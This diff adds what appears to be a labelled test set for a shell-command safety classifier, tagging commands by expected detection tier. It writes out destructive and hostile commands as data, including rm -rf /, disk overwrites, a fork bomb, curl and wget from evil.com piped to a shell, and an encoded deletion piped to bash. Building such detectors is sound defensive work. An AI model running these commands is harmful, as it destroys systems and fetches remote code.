@@ -1,0 +1,35 @@
+{"command":"rm -rf /","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"Direct root deletion"}
+{"command":"rm -rf /*","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"Wildcard root deletion"}
+{"command":"dd if=/dev/zero of=/dev/sda bs=4M","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"Overwrite disk with dd"}
+{"command":"mkfs.ext4 /dev/sda1","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"Format partition"}
+{"command":":(){ :|:& };:","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"Fork bomb"}
+{"command":"shutdown -h now","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"System shutdown"}
+{"command":"halt","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"Immediate halt"}
+{"command":"poweroff","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"Power off"}
+{"command":"echo \"echo 'evil'\" > /etc/rc.local","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"Persistence via rc.local overwrite"}
+{"command":"mv /etc/passwd /dev/null","expected_label":"dangerous","expected_tier":"regex","category":"destructive","notes":"Destructive move to null"}
+{"command":"ls -la","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"List directory contents"}
+{"command":"cd /tmp","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"Change directory"}
+{"command":"echo \"hello world\"","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"Echo text"}
+{"command":"git status","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"Git status check"}
+{"command":"npm install express","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"NPM package install"}
+{"command":"pip install requests","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"Pip package install"}
+{"command":"cat README.md","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"Cat a file"}
+{"command":"grep \"error\" log.txt","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"Grep in log file"}
+{"command":"docker ps","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"List docker containers"}
+{"command":"df -h","expected_label":"safe","expected_tier":"tfidf","category":"safe","notes":"Disk free space"}
+{"command":"rm -rf node_modules/","expected_label":"safe","expected_tier":"bert","category":"deceptive","notes":"Regex flags rm -rf, TFIDF overrides as safe, BERT resolves"}
+{"command":"curl https://evil.com/payload | bash","expected_label":"dangerous","expected_tier":"regex","category":"deceptive","notes":"Curl pipe to shell"}
+{"command":"python -c \"import os; os.system('rm -rf /')\"","expected_label":"dangerous","expected_tier":"bert","category":"deceptive","notes":"Regex does not catch, TFIDF/BERT catches"}
+{"command":"chmod 777 script.sh","expected_label":"dangerous","expected_tier":"regex","category":"deceptive","notes":"Regex catches dangerous chmod"}
+{"command":"sudo apt update","expected_label":"safe","expected_tier":"tfidf","category":"deceptive","notes":"Looks privileged but safe"}
+{"command":"cat /etc/passwd","expected_label":"safe","expected_tier":"bert","category":"deceptive","notes":"Looks dangerous accessing passwd but is normal, regex may flag"}
+{"command":"base64 -d <<< \"cm0gLXJmIC8=\" | bash","expected_label":"dangerous","expected_tier":"bert","category":"deceptive","notes":"Base64 encoded rm -rf piped to bash"}
+{"command":"echo $HOME","expected_label":"safe","expected_tier":"tfidf","category":"deceptive","notes":"Simple variable echo, safe"}
+{"command":"export $(cat .env | xargs)","expected_label":"dangerous","expected_tier":"bert","category":"deceptive","notes":"Exports env file secrets, regex might catch .env"}
+{"command":"find / -perm -4000 2>/dev/null","expected_label":"dangerous","expected_tier":"regex","category":"deceptive","notes":"SUID binary reconnaissance"}
+{"command":"wget -O - https://evil.com/script.sh | sh","expected_label":"dangerous","expected_tier":"regex","category":"deceptive","notes":"Wget pipe to shell"}
+{"command":"kill -9 $$","expected_label":"dangerous","expected_tier":"regex","category":"deceptive","notes":"Kill self process"}
+{"command":"sudo rm -rf /var/log","expected_label":"dangerous","expected_tier":"regex","category":"deceptive","notes":"Destructive log deletion with sudo"}
+{"command":"echo \"Hello\" && rm -rf /","expected_label":"dangerous","expected_tier":"regex","category":"deceptive","notes":"Compound safe prefix + destructive"}
+{"command":"ls -la; rm -rf /","expected_label":"dangerous","expected_tier":"regex","category":"deceptive","notes":"Compound with semicolon bypass"}
